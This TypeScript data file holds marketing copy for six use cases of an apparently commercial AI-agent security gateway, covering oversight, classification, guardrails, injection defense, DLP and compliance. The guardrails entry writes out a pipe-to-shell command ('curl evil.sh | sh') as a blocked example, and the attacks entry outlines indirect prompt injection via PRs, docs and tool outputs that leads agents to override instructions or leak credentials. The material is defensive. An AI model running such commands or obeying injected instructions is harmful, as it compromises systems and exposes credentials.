export interface UseCase {
  slug: string;
  badge: string;
  title: string;
  shortTitle: string;
  description: string;
  shortDescription: string;
  videoSrc: string;
  videoCaption: string;
  iconName: "Eye" | "FileCheck" | "ShieldAlert" | "Lock" | "Shield" | "ClipboardCheck";
  tagType: "logged" | "blocked" | "report";
  tagContent: string;
  commandContent: string;
  detailedParagraphs: string[];
}

export const useCasesData: Record<string, UseCase> = {
  "session-visibility-oversight": {
    slug: "session-visibility-oversight",
    badge: "USE CASE 01",
    title: "Session Visibility & Oversight",
    shortTitle: "Session Oversight",
    description:
      "See every prompt, session, MCP tool call, and action across browser, CLI, and desktop agents. Real-time and historical audit of all agent surfaces with zero-leak telemetry.",
    shortDescription: "See every prompt, MCP tool call & action across browser, CLI & desktop agents.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Real-time session oversight tracking prompts, MCP tool calls, and agent file reads.",
    iconName: "Eye",
    tagType: "logged",
    tagContent: "LOGGED",
    commandContent: "session → 47 prompts, 12 files read",
    detailedParagraphs: [
      "Gödel Security Gate provides continuous, real-time observability across all AI agent interaction surfaces. As AI coding tools, browser automation workflows, and Model Context Protocol (MCP) integrations become pervasive in engineering operations, security teams require complete visibility into the exact prompts submitted, files accessed, and actions executed by autonomous agents.",
      "By sitting as a zero-latency proxy at the local machine and enterprise gateway layers, Gödel captures every session event without exposing sensitive payload data to external third parties. Historical session telemetry is cryptographically hashed and indexed, allowing security administrators to audit past agent operations, investigate anomalies, and maintain total governance over their AI workforce.",
    ],
  },

  "content-classification": {
    slug: "content-classification",
    badge: "USE CASE 02",
    title: "Content Classification",
    shortTitle: "Content Classification",
    description:
      "Classify every prompt, document, tool output, and context source before the agent can use it. Block agents from accessing legal, HR, finance, board materials, and source code.",
    shortDescription: "Block agents from accessing legal, HR, finance, board materials & sensitive code.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Dynamic classification blocking unauthorized board memo paste in external LLM.",
    iconName: "FileCheck",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "paste board memo → ChatGPT",
    detailedParagraphs: [
      "Modern AI agents rely heavily on broad filesystem and workspace access to contextually assist developers and automated pipelines. Without granular content classification, agents can inadvertently ingest sensitive legal contracts, HR records, unannounced financial memos, board materials, or proprietary algorithms and transmit them to external LLMs.",
      "Gödel enforces real-time content classification at the exact moment context is loaded into an agent session. Built-in classifiers automatically tag sensitive content types and enforce deterministic deny rules—blocking unauthorized document reads and masking PII before data ever reaches a model prompt or external SaaS endpoint.",
    ],
  },

  "action-execution-guardrails": {
    slug: "action-execution-guardrails",
    badge: "USE CASE 03",
    title: "Action & Execution Guardrails",
    shortTitle: "Execution Guardrails",
    description:
      "Risk-score and gate shell, git, package, network, cloud, and admin actions. Prevent unsafe downstream actions when suspicious or restricted context is in scope.",
    shortDescription: "Risk-score and gate shell, git, package, cloud & network actions in real time.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Intercepting and blocking malicious subshell command execution (curl evil.sh | sh).",
    iconName: "ShieldAlert",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "curl evil.sh | sh",
    detailedParagraphs: [
      "Autonomous agents frequently attempt terminal command execution, dependency installation, git commits, and cloud infrastructure modifications. Execution guardrails risk-score every command before it reaches the operating system kernel, ensuring that agents cannot run destructive or unauthorized commands.",
      "Whether intercepting malicious subshell calls (such as curl | sh), blocking hallucinated npm/pip packages, or gating destructive cloud CLI operations (e.g. deleting production databases), Gödel applies strict, policy-based execution rules that protect critical enterprise infrastructure.",
    ],
  },

  "ai-attacks-defense": {
    slug: "ai-attacks-defense",
    badge: "USE CASE 04",
    title: "AI Attacks & Trust-Surface Defense",
    shortTitle: "AI Attacks Defense",
    description:
      "Detect AI attacks in docs, images, PRs, issues, tool output, emails, and web content. Monitor CLAUDE.md, AGENTS.md, skills, hooks, and local trust files for malicious changes.",
    shortDescription: "Detect prompt injection & monitor CLAUDE.md, AGENTS.md & local trust files.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Blocking unauthorized override attempt on local CLAUDE.md and AGENTS.md instruction files.",
    iconName: "Lock",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "CLAUDE.md → override attempt",
    detailedParagraphs: [
      "Attackers increasingly target AI agents through indirect prompt injection, embedding malicious instructions within pull requests, documentation, web pages, issues, and tool outputs. These injections can trick agents into overriding local instructions or leaking internal credentials.",
      "Gödel continuously monitors local agent instruction files—such as CLAUDE.md, AGENTS.md, and .cursorrules—preventing unauthorized modifications. Simultaneously, Gödel scans incoming contextual data streams for indirect prompt injection techniques, protecting your agent fleet against manipulation.",
    ],
  },

  "data-loss-prevention": {
    slug: "data-loss-prevention",
    badge: "USE CASE 05",
    title: "Data Loss Prevention (DLP)",
    shortTitle: "Data Loss Prevention",
    description:
      "Prevent sensitive data from leaving through agent-driven channels, not just email and web. Block classified code, credentials, PII, and internal data from reaching Slack, SaaS apps, or external LLMs.",
    shortDescription: "Block classified code, credentials, PII & internal data from reaching external LLMs or Slack.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Detecting and blocking unauthorized customer list transfer to third-party AI service.",
    iconName: "Shield",
    tagType: "blocked",
    tagContent: "BLOCKED",
    commandContent: "customer_list.csv → Perplexity",
    detailedParagraphs: [
      "Traditional DLP solutions inspect email and standard web traffic, but fall short when AI agents communicate across custom API endpoints, MCP tool calls, webhooks, and third-party LLM providers. Gödel closes this critical coverage gap by enforcing DLP directly at the agent communication boundary.",
      "Every outgoing prompt, tool argument, and API payload is evaluated in sub-5 milliseconds. Classified source code, API keys, SSH credentials, customer PII, and trade secrets are dynamically blocked or redacted before they can leave your organization's security boundary.",
    ],
  },

  "audit-compliance-reporting": {
    slug: "audit-compliance-reporting",
    badge: "USE CASE 06",
    title: "Audit & Compliance Reporting",
    shortTitle: "Audit & Compliance",
    description:
      "Generate comprehensive audit trails and compliance reports that demonstrate agent governance in action. Meet SOC 2, ISO 27001, HIPAA, and regulatory requirements with one-click evidence.",
    shortDescription: "One-click compliance reporting for SOC 2, ISO 27001, HIPAA & AI regulations.",
    videoSrc: "/video/Product Walkthrough Final.mp4",
    videoCaption: "Generating SOC 2 & ISO 27001 audit evidence for 847 audited agent sessions.",
    iconName: "ClipboardCheck",
    tagType: "report",
    tagContent: "REPORT",
    commandContent: "847 sessions audited, 100% compliant",
    detailedParagraphs: [
      "Enterprise adoption of AI agents requires strict adherence to regulatory standards and internal governance frameworks. Gödel automates audit evidence collection by generating immutable, tamper-evident logs of every agent action, tool invocation, and security decision.",
      "Designed for SOC 2 Type II, ISO 27001, HIPAA, and the EU AI Act, Gödel converts raw agent telemetry into structured compliance reports with one click. Security teams can seamlessly stream audit trails into enterprise SIEMs like Splunk, Datadog, or Amazon S3.",
    ],
  },
};
